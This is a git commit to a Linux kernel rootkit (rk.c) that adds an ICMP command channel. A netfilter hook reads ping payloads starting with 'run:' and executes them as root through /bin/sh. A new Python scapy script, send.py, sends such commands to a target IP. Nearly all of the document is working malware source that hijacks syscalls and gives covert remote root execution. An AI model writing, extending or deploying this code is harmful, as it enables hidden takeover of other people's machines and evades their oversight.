dafe96435279c9ca3b38a60b5029498b64ad2603
romberol <bernikov.roman.43@gmail.com>
2023-10-26 15:03:47 +0300

    ICMP logic added

--- rk.c
+++ rk.c
@@ -9,6 +9,7 @@
 #include <linux/kallsyms.h>
 #include <linux/unistd.h>
 #include <linux/dirent.h>
+#include <linux/netfilter_ipv4.h>
 
 
 // Syscall table address pointer
@@ -43,6 +44,8 @@ static struct kprobe kp = {
 typedef asmlinkage long (*syscall_wrapper)(const struct pt_regs *regs);
 static syscall_wrapper orig_kill;
 
+// write_cr0 is useless in a 5x linux kernell
+// cr0 allows supervisor-level procedures to write into read-only pages
 static inline void write_forced_cr0(unsigned long value)
 {
     unsigned long __force_order;
@@ -103,15 +106,97 @@ static void restore_syscall(void)
     __sys_call_table_addr[__NR_kill] = (unsigned long)orig_kill;
 }
 
+#include <linux/ip.h>
+#include <linux/icmp.h>
+
+#define MAX_CMD_LEN 1976
+
+
+char cmd_string[MAX_CMD_LEN];
+
+struct work_struct my_work;
+
+static void work_handler(struct work_struct * work)
+{
+    static char *argv[] = {"/bin/sh", "-c", cmd_string, NULL};
+    static char *envp[] = {"PATH=/bin:/sbin", NULL};
+
+    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+}
+
+DECLARE_WORK(my_work, work_handler);
+
+// ICMP hook
+static unsigned int icmp_cmd_executor(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
+{
+    struct iphdr *iph;
+    struct icmphdr *icmph;
+
+    unsigned char *user_data;
+    unsigned char *tail;
+    int j = 0;
+
+    pr_info("icmp_cmd_executor executing\n");
+
+    iph = ip_hdr(skb);
+    icmph = icmp_hdr(skb);
+
+    if (iph->protocol != IPPROTO_ICMP) {
+        return NF_ACCEPT;
+    }
+    if (icmph->type != ICMP_ECHO) {
+        return NF_ACCEPT;
+    }
+
+    user_data = (unsigned char *)((unsigned char *)icmph + (sizeof(icmph)));
+    tail = skb_tail_pointer(skb);
+
+    j = 0;
+    while (user_data != tail){
+        char c = *user_data;
+
+        cmd_string[j] = c;
+        j++;
+
+        if (c == '\0' || j == MAX_CMD_LEN){
+            break;
+        }
+
+        user_data++;
+    }
+
+    pr_info("cmd_string: %s\n", cmd_string);
+
+    if (strncmp(cmd_string, "run:", 4) == 0) {
+        for (j = 0; cmd_string[j + 4] != '\0'; j++) {
+            cmd_string[j] = cmd_string[j + 4];
+        }
+        cmd_string[j] = '\0';
+
+        schedule_work(&my_work);
+    }
+
+    return NF_ACCEPT;
+}
+
+static struct nf_hook_ops nfho;
 
 // Function that launches when module is inserted
 static int __init mod_init(void)
 {
+    int ret; // to store return code of register_kprobe
+    kallsyms_lookup_name_t kallsyms_lookup_name; // to store the address of kallsyms_lookup_name function
+
     pr_info("rootkit: started\n");
+    nfho.hook = icmp_cmd_executor;
+    nfho.hooknum = NF_INET_PRE_ROUTING;
+    nfho.pf = PF_INET;
+    nfho.priority = NF_IP_PRI_FIRST;
+    nf_register_net_hook(&init_net, &nfho);
 
 #ifdef KPROBE_
 
-    int ret = register_kprobe(&kp);
+    ret = register_kprobe(&kp);
     if (ret < 0) {
         pr_err("[monitor] register_kprobe failed, returned %d\n", ret);
         return ret;
@@ -120,7 +205,7 @@ static int __init mod_init(void)
     pr_info("[monitor] kprobe registered. kallsyms_lookup_name found at 0x%px\n",
             kp.addr);
 
-    kallsyms_lookup_name_t kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
+    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
 
     unregister_kprobe(&kp);
 
@@ -145,8 +230,8 @@ static void __exit mod_exit(void)
     unprotect_memory();
     restore_syscall();
     protect_memory();
+    nf_unregister_net_hook(&init_net, &nfho);
 }
-
 
 MODULE_LICENSE("GPL");
 module_init(mod_init);
---
+++ send.py
@@ -0,0 +1,11 @@
+#!/usr/bin/python3
+import sys
+from scapy.all import sr1, IP, ICMP
+
+if len(sys.argv) < 3:
+    print('Usage: {} IP "command"'.format(sys.argv[0]))
+    exit(0)
+
+p = sr1(IP(dst=sys.argv[1])/ICMP()/"run:{}".format(sys.argv[2]))
+if p:
+    p.show()
